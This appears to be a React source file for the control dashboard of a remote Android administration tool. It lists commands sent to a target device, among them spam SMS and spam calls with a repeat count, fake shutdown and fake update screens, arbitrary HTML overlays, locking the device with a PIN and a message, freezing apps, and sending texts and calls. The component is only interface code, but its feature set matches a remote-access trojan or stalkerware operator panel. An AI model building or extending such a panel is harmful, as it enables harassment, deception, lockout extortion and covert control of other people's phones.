'use client';

import { useState } from 'react';
import { motion } from 'framer-motion';
import CommandModal from '../common/CommandModal';
import {
  FiGlobe, FiAirplay, FiBluetooth, FiWifi, FiZap, FiPhone,
  FiVolume2, FiSun, FiLock, FiEye, FiSend, FiMail, FiMessageCircle,
  FiMusic, FiImage, FiAlertCircle, FiShield, FiSmartphone
} from 'react-icons/fi';
import toast from 'react-hot-toast';

const commandCategories = [
  {
    name: '🌐 Device Control',
    icon: FiSmartphone,
    commands: [
      { id: 'OPEN_WEB', name: 'Open Website', icon: FiGlobe, params: ['url'] },
      { id: 'AIRPLANE_MODE', name: 'Airplane Mode', icon: FiAirplay, params: ['enabled'] },
      { id: 'BLUETOOTH', name: 'Bluetooth', icon: FiBluetooth, params: ['enabled'] },
      { id: 'WIFI', name: 'WiFi', icon: FiWifi, params: ['enabled'] },
      { id: 'TORCH', name: 'Torch', icon: FiZap, params: ['enabled'] },
      { id: 'VIBRATE', name: 'Vibrate', icon: FiZap, params: ['duration'] },
      { id: 'HOTSPOT', name: 'Hotspot', icon: FiWifi, params: ['enabled', 'ssid', 'password'] },
      { id: 'SHOW_TOAST', name: 'Show Toast', icon: FiSend, params: ['message'] },
      { id: 'TEXT_TO_SPEECH', name: 'Text to Speech', icon: FiVolume2, params: ['text'] },
    ]
  },
  {
    name: '📱 Communication',
    icon: FiPhone,
    commands: [
      { id: 'MAKE_CALL', name: 'Make Call', icon: FiPhone, params: ['number'] },
      { id: 'SEND_SMS', name: 'Send SMS', icon: FiMessageCircle, params: ['number', 'message'] },
      { id: 'SEND_WHATSAPP', name: 'WhatsApp', icon: FiMessageCircle, params: ['number', 'message'] },
      { id: 'SEND_NOTIFICATION', name: 'Send Notification', icon: FiSend, params: ['title', 'message'] },
      { id: 'SPAM_SMS', name: 'Spam SMS', icon: FiMail, params: ['number', 'message', 'count'] },
      { id: 'SPAM_CALL', name: 'Spam Call', icon: FiPhone, params: ['number', 'count'] },
    ]
  },
  {
    name: '🎮 Media & Display',
    icon: FiVolume2,
    commands: [
      { id: 'SET_BRIGHTNESS', name: 'Set Brightness', icon: FiSun, params: ['level'] },
      { id: 'SET_VOLUME', name: 'Set Volume', icon: FiVolume2, params: ['level', 'type'] },
      { id: 'SET_SILENT_MODE', name: 'Silent Mode', icon: FiVolume2, params: ['enabled'] },
      { id: 'SET_WALLPAPER', name: 'Set Wallpaper', icon: FiImage, params: ['url'] },
      { id: 'PLAY_MUSIC', name: 'Play Music', icon: FiMusic, params: ['url'] },
    ]
  },
  {
    name: '🔒 Lock & Security',
    icon: FiLock,
    commands: [
      { id: 'LOCK_DEVICE', name: 'Lock Device', icon: FiLock, params: ['lockType', 'pinCode', 'message'] },
      { id: 'SHOW_OVERLAY', name: 'Show Overlay', icon: FiEye, params: ['htmlContent', 'url'] },
      { id: 'FAKE_SHUTDOWN', name: 'Fake Shutdown', icon: FiShield, params: [] },
      { id: 'FAKE_UPDATE', name: 'Fake Update', icon: FiShield, params: ['progress'] },
      { id: 'SHOW_BANNER', name: 'Show Banner', icon: FiAlertCircle, params: ['text', 'duration'] },
      { id: 'FREEZE_APP', name: 'Freeze App', icon: FiLock, params: ['packageName'] },
      { id: 'UNFREEZE_APP', name: 'Unfreeze App', icon: FiLock, params: ['packageName'] },
    ]
  }
];

export default function DeviceCommands({ deviceId, onCommand }) {
  const [selectedCommand, setSelectedCommand] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleCommandClick = (command) => {
    setSelectedCommand(command);
    setShowModal(true);
  };

  const handleExecute = async (params) => {
    setLoading(true);
    try {
      await onCommand(selectedCommand.id, params);
      toast.success(`${selectedCommand.name} executed successfully`);
      setShowModal(false);
    } catch (error) {
      toast.error(`Failed to execute ${selectedCommand.name}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      {commandCategories.map((category, idx) => {
        const Icon = category.icon;
        return (
          <motion.div
            key={idx}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: idx * 0.1 }}
            className="bg-white dark:bg-gray-800 rounded-xl shadow-lg overflow-hidden"
          >
            <div className="p-6 border-b dark:border-gray-700">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-purple-100 dark:bg-purple-900 rounded-lg flex items-center justify-center">
                  <Icon className="text-purple-600 dark:text-purple-400" size={20} />
                </div>
                <h3 className="text-lg font-semibold text-gray-800 dark:text-white">{category.name}</h3>
              </div>
            </div>
            <div className="p-6">
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
                {category.commands.map((cmd) => {
                  const CmdIcon = cmd.icon;
                  return (
                    <button
                      key={cmd.id}
                      onClick={() => handleCommandClick(cmd)}
                      disabled={loading}
                      className="flex flex-col items-center gap-2 p-4 bg-gray-50 dark:bg-gray-700 rounded-xl hover:bg-purple-50 dark:hover:bg-purple-900 transition group"
                    >
                      <CmdIcon className="text-gray-600 dark:text-gray-400 group-hover:text-purple-600 dark:group-hover:text-purple-400" size={24} />
                      <span className="text-xs text-center text-gray-600 dark:text-gray-400 group-hover:text-purple-600 dark:group-hover:text-purple-400">
                        {cmd.name}
                      </span>
                    </button>
                  );
                })}
              </div>
            </div>
          </motion.div>
        );
      })}

      <CommandModal
        isOpen={showModal}
        command={selectedCommand}
        onClose={() => setShowModal(false)}
        onExecute={handleExecute}
        loading={loading}
      />
    </div>
  );
         }
